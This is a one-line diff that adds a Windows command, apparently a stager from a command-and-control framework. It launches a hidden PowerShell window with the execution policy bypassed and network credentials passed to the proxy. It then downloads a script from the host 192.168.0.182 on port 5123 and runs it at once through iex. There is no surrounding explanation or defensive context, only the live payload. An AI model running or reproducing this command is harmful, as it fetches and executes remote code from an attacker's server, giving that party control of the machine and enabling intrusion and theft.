@@ -1,0 +1,1 @@
+start powershell.exe -nol -w 1 -nop -ep bypass (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.0.182:5123/download/powershell/')-UseBasicParsing|iex
